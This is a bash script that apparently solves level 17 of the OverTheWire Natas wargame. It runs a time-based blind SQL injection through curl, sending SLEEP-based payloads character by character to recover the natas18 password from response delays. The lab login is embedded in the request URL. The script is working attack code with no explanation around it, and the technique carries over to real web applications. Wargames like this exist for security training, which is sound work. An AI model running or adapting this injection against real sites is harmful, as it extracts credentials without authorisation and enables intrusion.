#!/bin/bash

function hack() {
	chars="a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0"
	word="(?<=time:)\\d"
	for x in {1..32}; do
		for i in $chars; do
			ascii_code=$(printf %d \'$i)
			attack_word=$(generate-attack-string $x $ascii_code)
			result=$(request "$attack_word" | grep -Po "$word")
			if [ $result -gt 4 ]; then
				printf $i
				break
			fi
		done
	done
}

function request() {
	curl -s --write-out 'time:%{time_total}' -d "$1" http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org?debug
}

function generate-attack-string() {
	printf "username=natas18\" AND IF(ASCII(SUBSTRING(password,$1,1))=$2,SLEEP(5),1)#--"
}